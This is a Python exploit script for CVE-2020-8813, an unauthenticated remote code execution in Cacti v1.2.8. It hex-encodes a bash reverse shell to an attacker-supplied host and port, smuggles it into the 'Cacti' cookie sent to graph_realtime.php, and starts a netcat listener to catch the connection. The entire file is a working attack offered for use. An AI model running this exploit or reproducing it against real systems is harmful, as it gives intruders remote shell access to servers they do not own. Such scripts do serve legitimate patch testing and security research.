#!/usr/bin/python3
# Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution
# Date: 04/21/2021
# Exploit Author: (m4ud)
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: CentOS 7.3,Ubuntu 16.04, Debian9, Debian 10 / PHP 7.1.33, PHP 7.0

import requests
import sys
import warnings
from bs4 import BeautifulSoup
from urllib.parse import quote
import binascii
from optparse import OptionParser
warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
import subprocess

class burning_cactus:
  def __init__(self, options):
    self.url = options.url
    self.lport = options.lport
    self.lhost = options.lhost

#proxy = "http://127.0.0.1:8080"
#proxies = { "http" : proxy }

  def burn_cacti(self):
    shell = "bash -i >&/dev/tcp/%s/%s 0>&1" % (self.lhost, self.lport)
    v = binascii.hexlify(bytes(shell, encoding='utf-8')).decode("utf-8")
    url = self.url
    payload = ";echo${IFS}" + v + "|xxd${IFS}-p${IFS}-r|bash"
    print(payload)
    cookies = {'Cacti': quote(payload)}
    path = url+"/graph_realtime.php?action=init"
    print("[+] S3nd1ng 3v1l r3qu3st, SHELL???? [+]")
    print("[+] Burn1ng C4ct1!! [+]")
#    requests.get(path, cookies=cookies, proxies=proxies)
    f = subprocess.Popen(["nc", "-lvnp", str(self.lport)])
    requests.get(path, cookies=cookies)
    f.communicate()

def main():
  parser = OptionParser()
  parser.add_option("-u", "--url", dest="url", help="[ Required ] target URL eg:. http://Cacti/")
  parser.add_option("-l", "--lhost", dest="lhost", help="[ Required ] Attacker IP addr")
  parser.add_option("-p", "--lport", dest="lport", default=443, help="[ Default 443 ] Attacker IP Port")
  (options, args) = parser.parse_args()

  if not options.lhost and options.url:   # if filename is not given
    parser.error('[x] Gonna need both an URL and your IP! [x]')
  if options.url:
    exploit = burning_cactus(options)
    if exploit.burn_cacti():
      log("Success! Do i have a Shell??")
  else:
    parser.print_help()
if __name__=="__main__":
  main()

